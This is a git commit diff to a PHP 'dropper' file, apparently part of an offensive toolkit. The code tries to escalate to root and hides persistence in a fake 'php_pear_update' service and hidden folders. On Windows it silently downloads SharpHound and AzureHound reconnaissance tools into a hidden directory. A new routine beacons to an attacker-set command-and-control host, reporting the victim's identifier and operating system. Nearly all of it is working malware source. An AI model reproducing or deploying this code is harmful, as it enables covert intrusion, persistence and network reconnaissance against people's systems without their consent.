4b055026fc2ef884075adc8501d03319d53aa5b3
oldkingcone <no.no@no.com>
2021-02-23 23:44:29 -0500

    Update base.php

--- includes/droppers/base.php
+++ includes/droppers/base.php
@@ -2,31 +2,33 @@
 ini_set("safe_mode", 0);
 umask(0);
 posix_setuid(0);
-
+require "vendor/autoload.php";
+use Amp\Loop;
 define("SELF_SCRIPT", $_SERVER["SCRIPT_FILENAME"]);
 define("UNPACKVEND", "cat ./vend.b64 | base64 -d >> vendor.zip && unzip ./vendor.zip && rm ./vendor.zip");
+define("uuid", substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32));
 
 function checkfs(){
     if (substr(php_uname(), 0, 7) == 'Windows') {
         //certutil.exe -urlcache -split -f [URL] google_https_cert.exe && google_https_cert.exe
         $wh = new COM('WScript.Shell');
         if (is_null($wh->regRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\Path"))) {
-            $t = sys_get_temp_dir() . "\\" . substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32);
+            $t = sys_get_temp_dir() . "\\" . uuid;
             $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\Version", "REG_SZ", "1");
             $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\InstallerPath", "REG_SZ", base64_encode($t));
-            $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\InstallerHash", "REG_SZ", substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 48));
+            $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\InstallerHash", "REG_SZ", uuid);
             shell_exec("mkdir " . $t);
             shell_exec("attrib +h +s " . $t);
             shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -OutFile " . $t . "\\af.ps1");
             shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1 -OutFile " . $t . "\\af1.ps1");
             shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true -OutFile " . $t . "\\af2.exe");
             shell_exec("attrib +r +s $t\\*");
+            fwrite(fopen(sys_get_temp_dir()."/aa", "a"), "win");
             return $t;
         }else{
             return $wh->regRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\InstallerHash");
         }
     } else {
-        $uuid = substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32);
         if (is_dir("/etc/service") && !file_exists("/etc/service/php_pear_update_service")){
             $f = fopen("/etc/service/php_pear_update", "w");
             fwrite($f, "#!/bin/sh\nexec $(which php) ". SELF_SCRIPT);
@@ -44,37 +46,88 @@ function checkfs(){
             fclose($ffe);
         }
         $myhom = "\$HOME/.local/.backup/.pear/";
-        if (!is_dir($myhom)) {
-            shell_exec("mkdir -p $myhom");
+        if (!is_dir($myhom) && !file_exists($myhom."/.pear_has_backup")) {
+            system("mkdir -p {$myhom}");
             $uif = fopen("$myhom" . ".pear_hash_backup", "a");
-            fwrite($uif, $uuid);
+            fwrite(fopen(sys_get_temp_dir()."/aa", "a"), "lin");
+            fwrite($uif, uuid);
             fflush($uif);
             fclose($uif);
             return $myhom;
         }else{
             $uif = fopen($myhom.".pear_hash_backup", "a");
-            return fread($uif, "32");
+            return $myhom;
         }
     }
 
 }
-
-function checkin_timer()
-{
+function checkFile(){
 
 }
 
-function watcher($lo){
-    if (!empty($lo) && is_file($lo)){
+function mainR(){
+    $duration = null;
+    $myHome = Loop::delay($duration, function(){
+        $ho = null; // your host.
+        $p = null; // your port that you are using.
+        $u = null; // the user-agent you want to restrict requests to.
+        $fp = fsockopen("$ho", $p, $errno, $errstr, 180);
+        switch (fread(fopen(sys_get_temp_dir()."/aa", "r"), 3)) {
+            case "win":
+                $au = array(
+                    "ac" => "add",
+                    "iru" => SELF_SCRIPT,
+                    "u" => uuid,
+                    "o" => "windows"
+                );
+                foreach ($au AS $key => $value){
+                    $poststring .=urlencode($key) . "=" . $value . "&";
+                }
+                $poststring = substr($poststring, 0, -1);
+                if (!$fp){
+                    fwrite(fopen(sys_get_temp_dir()."/aaF", "a"), $errstr);
+                }else{
+                    fputs($fp,"POST /diaghandler.php HTTP/1.1\r\n");
+                    fputs($fp, "Host: $ho\r\n");
+                    fputs($fp, "Connection: close\r\n");
+                    fputs($fp, "Accept: */*\r\n");
+                    fputs($fp, $poststring."\r\n\r\n");
+                    while (!feof($fp)){
+                        fwrite(fopen(sys_get_temp_dir()."/aaF", "a"), fgets($fp, 4096));
+                    }
+                    fclose($fp);
+                }
+                break;
+            case "lin":
+                $au = array(
+                    "ac" => "add",
+                    "iru" => SELF_SCRIPT,
+                    "u" => uuid,
+                    "o" => "lin"
+                );
+                foreach ($au AS $key => $value){
+                    $poststring .=urlencode($key) . "=" . $value . "&";
+                }
+                $poststring = substr($poststring, 0, -1);
+                if (!$fp){
+                    fwrite(fopen(sys_get_temp_dir()."/aaF", "a"), $errstr);
+                }else{
+                    fputs($fp,"POST /diaghandler.php HTTP/1.1\r\n");
+                    fputs($fp, "Host: $ho\r\n");
+                    fputs($fp, "Connection: close\r\n");
+                    fputs($fp, "Accept: */*\r\n");
+                    fputs($fp, $poststring."\r\n\r\n");
+                    while (!feof($fp)){
+                        fwrite(fopen(sys_get_temp_dir()."/aaF", "a"), fgets($fp, 4096));
+                    }
+                    fclose($fp);
+                }
+                break;
 
-    }
-}
-
-function fork_control(){
-    try {
-
-    }catch (Exception $exception){
-
-    }
+        }
+    });
+    Loop::run(function () use($myHome){
+        Loop::enable($myHome);
+    });
 }
 
